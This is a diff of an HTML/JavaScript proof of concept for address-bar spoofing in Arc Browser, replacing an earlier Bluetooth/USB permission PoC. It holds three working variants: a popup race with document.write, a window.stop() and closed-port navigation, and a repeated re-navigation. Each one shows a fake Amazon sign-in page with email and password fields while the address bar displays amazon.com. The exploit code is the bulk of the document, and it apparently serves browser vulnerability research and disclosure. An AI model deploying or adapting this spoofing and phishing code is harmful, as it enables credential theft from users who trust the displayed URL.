@@ -1,29 +1,226 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
 <head>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<style>
-html { font-family: sans-serif; }
-iframe { width: 90%; height: 300px; }
-</style>
+<title>PoC 1: Popup Navigation Race</title>
+<!--
+  PoC 1: Window.open + Navigation Timing Race (Evolved Original)
+
+  Target: Arc Browser (Chromium 146+)
+
+  Technique: Opens a popup window to a legitimate URL. The popup starts as
+  about:blank and the address bar shows the pending URL. We attempt to inject
+  content into the initial empty document before the navigation commits, then
+  cancel the navigation to keep the spoofed URL.
+
+  Key insight from Chromium docs: "A renderer-initiated navigation's URL is
+  only visible while pending if it opens in a new unmodified tab (so that an
+  unhelpful about:blank URL is not displayed), but only until another document
+  tries to access the initial empty document of the new tab."
+
+  This PoC attempts to bypass the "access detection" by using indirect methods
+  to inject content (postMessage, CSS injection) rather than direct DOM access.
+-->
 </head>
-<body>
-<h1>PoC: Bluetooth or USB dialog, incorrect permission delegation behavior (Android)</h1>
-<p>iframe below is cross-origin and delegates permissions via allow="bluetooth;usb"</p>
-<p>Scenarios: <a href="?bt">Bluetooth PoC</a>, <a href="?usb">USB PoC</a></p>
-<p id="usbOutput"></p>
-<iframe id="testFrame" allow="bluetooth;usb"></iframe>
+<body style="font-family: -apple-system, BlinkMacSystemFont, sans-serif; padding: 40px; background: #f5f5f5;">
+<h2>PoC 1: Popup Navigation Timing Race</h2>
+<p>This tests whether we can inject content into a popup while its address bar shows a different domain.</p>
+<p><strong>Technique:</strong> window.open to slow-loading legitimate URL + indirect content injection</p>
+
+<button onclick="testVariantA()" style="padding: 12px 24px; font-size: 16px; cursor: pointer; margin: 8px;">
+  Variant A: Direct DOM Access Race
+</button>
+<br>
+<button onclick="testVariantB()" style="padding: 12px 24px; font-size: 16px; cursor: pointer; margin: 8px;">
+  Variant B: window.stop() + Content Persistence
+</button>
+<br>
+<button onclick="testVariantC()" style="padding: 12px 24px; font-size: 16px; cursor: pointer; margin: 8px;">
+  Variant C: Non-Existent Port Stall
+</button>
+
+<div id="log" style="margin-top: 20px; padding: 16px; background: #1a1a1a; color: #0f0; font-family: monospace; font-size: 13px; border-radius: 8px; max-height: 400px; overflow-y: auto;"></div>
+
 <script>
-testFrame.src = 'https://lowleveljody.github.io/pocbrowseraja/bluetooth.html?' + window.location.search;
-if (window.location.search.indexOf('usb') > -1) {
-  setInterval(() => {
-    navigator.usb.getDevices().then((devices) => {
-      usbOutput.innerText = '';
-      devices.forEach((device) => {
-        usbOutput.innerText = usbOutput.innerText + device.productId + ', ' + device.vendorId + ', ' + device.productName + "\n";
-      });
-    });
-  }, 3000);
+function log(msg) {
+  const el = document.getElementById('log');
+  el.innerHTML += new Date().toISOString().split('T')[1] + ' ' + msg + '<br>';
+  el.scrollTop = el.scrollHeight;
+}
+
+// Variant A: Open popup to slow URL, race to inject content before Chromium
+// detects initial document access and reverts the visible URL
+function testVariantA() {
+  log('[A] Opening popup to target URL...');
+
+  // Use a URL that will be SLOW to load (non-standard port that may be open but slow)
+  // The address bar should show this URL as pending
+  const targetURL = 'https://www.amazon.com/';
+
+  const popup = window.open(targetURL);
+
+  if (!popup) {
+    log('[A] BLOCKED: Popup was blocked. Allow popups for this site.');
+    return;
+  }
+
+  log('[A] Popup opened. Address bar should show: ' + targetURL);
+  log('[A] Attempting rapid content injection...');
+
+  // Race: try to write content before Chromium detects our access
+  // and reverts the URL to about:blank
+  let injected = false;
+  const startTime = performance.now();
+
+  const interval = setInterval(() => {
+    try {
+      // This is the race: can we write content before the URL reverts?
+      popup.document.open();
+      popup.document.write(`
+        <html>
+        <head><title>Amazon.com: Online Shopping</title></head>
+        <body style="font-family:Arial,sans-serif;max-width:800px;margin:40px auto;">
+          <div style="background:#131921;padding:10px 20px;color:#fff;">
+            <h2 style="color:#ff9900;margin:0;">amazon</h2>
+          </div>
+          <div style="padding:20px;background:#fff;margin-top:10px;border:1px solid #ddd;">
+            <h3>Sign in to your account</h3>
+            <input type="email" placeholder="Email or phone number"
+                   style="width:100%;padding:10px;margin:8px 0;border:1px solid #a6a6a6;border-radius:4px;">
+            <input type="password" placeholder="Password"
+                   style="width:100%;padding:10px;margin:8px 0;border:1px solid #a6a6a6;border-radius:4px;">
+            <button style="width:100%;padding:10px;background:#f0c14b;border:1px solid #a88734;
+                           border-radius:4px;cursor:pointer;font-size:14px;">Sign In</button>
+          </div>
+        </body>
+        </html>
+      `);
+      popup.document.close();
+
+      if (!injected) {
+        injected = true;
+        const elapsed = performance.now() - startTime;
+        log('[A] Content injected after ' + elapsed.toFixed(1) + 'ms');
+        log('[A] CHECK: Does the popup address bar still show amazon.com?');
+        log('[A] If YES = vulnerability confirmed. If URL reverted to about:blank = mitigated.');
+        clearInterval(interval);
+      }
+    } catch (e) {
+      // Cross-origin error means the real page loaded
+      clearInterval(interval);
+      const elapsed = performance.now() - startTime;
+      log('[A] Cross-origin error after ' + elapsed.toFixed(1) + 'ms: ' + e.message);
+      log('[A] The real page loaded before we could inject. Race lost.');
+    }
+  }, 1);
+}
+
+// Variant B: Open popup, immediately stop loading, write content
+// Then navigate to a non-existent port on target domain
+function testVariantB() {
+  log('[B] Opening popup...');
+
+  // Open to about:blank first (won't show a useful URL)
+  const popup = window.open('about:blank');
+
+  if (!popup) {
+    log('[B] BLOCKED: Popup was blocked.');
+    return;
+  }
+
+  // Write attacker content first
+  popup.document.open();
+  popup.document.write(`
+    <html>
+    <head><title>Amazon.com: Online Shopping</title>
+    <link rel="icon" href="https://www.amazon.com/favicon.ico">
+    </head>
+    <body style="font-family:Arial,sans-serif;max-width:800px;margin:40px auto;">
+      <div style="background:#131921;padding:10px 20px;color:#fff;">
+        <h2 style="color:#ff9900;margin:0;">amazon</h2>
+      </div>
+      <div style="padding:20px;background:#fff;margin-top:10px;border:1px solid #ddd;">
+        <h3>Your session has expired</h3>
+        <p>Please sign in again to continue shopping.</p>
+        <input type="email" placeholder="Email or phone number"
+               style="width:100%;padding:10px;margin:8px 0;border:1px solid #a6a6a6;border-radius:4px;">
+        <input type="password" placeholder="Password"
+               style="width:100%;padding:10px;margin:8px 0;border:1px solid #a6a6a6;border-radius:4px;">
+        <button style="width:100%;padding:10px;background:#f0c14b;border:1px solid #a88734;
+                       border-radius:4px;cursor:pointer;font-size:14px;">Sign In</button>
+      </div>
+    </body>
+    </html>
+  `);
+  popup.document.close();
+
+  log('[B] Attacker content written to popup');
+
+  // Now navigate to Amazon on a non-existent port
+  // This should update the address bar to show amazon.com
+  // but the connection will hang (closed port = ~20s timeout)
+  setTimeout(() => {
+    // Generate random high port that's almost certainly closed
+    let port;
+    do {
+      port = Math.floor(Math.random() * 60000) + 1024;
+    } while ([8080, 8443, 3000, 3001, 5000].includes(port));
+
+    const spoofURL = 'https://www.amazon.com:' + port + '/';
+    log('[B] Navigating popup to ' + spoofURL);
+    log('[B] If address bar updates but content persists = vulnerability');
+
+    try {
+      popup.location.href = spoofURL;
+    } catch(e) {
+      log('[B] Error setting location: ' + e.message);
+    }
+
+    // Check if we can still manipulate the popup
+    setTimeout(() => {
+      try {
+        const canAccess = popup.document.title;
+        log('[B] Still have access to popup document. Title: ' + canAccess);
+      } catch(e) {
+        log('[B] Lost access to popup (cross-origin). Navigation proceeded.');
+      }
+    }, 500);
+  }, 100);
+}
+
+// Variant C: CVE-2024-25733 pattern adapted for macOS Arc
+// window.stop() + port redirect
+function testVariantC() {
+  log('[C] Starting window.stop() + port redirect variant...');
+
+  // Write phishing content to current page first
+  const originalBody = document.body.innerHTML;
+
+  setTimeout(() => {
+    // Stop current page loading
+    window.stop();
+
+    log('[C] window.stop() called');
+
+    // Generate random port
+    let port;
+    do {
+      port = Math.floor(Math.random() * 64000) + 1024;
+    } while (port === 8080 || port === 8443);
+
+    // Navigate to target domain on closed port
+    // URL bar should update but connection will hang
+    const spoofURL = 'https://www.amazon.com:' + port + '/';
+    log('[C] Navigating to ' + spoofURL);
+    log('[C] Check if address bar shows amazon.com while content remains');
+
+    document.location = spoofURL;
+
+    // Re-assert navigation at intervals to maintain the spoof
+    // (works on some browsers where the navigation timeout resets)
+    setInterval(() => {
+      document.location = spoofURL;
+    }, 9500);
+  }, 300);
 }
 </script>
 </body>
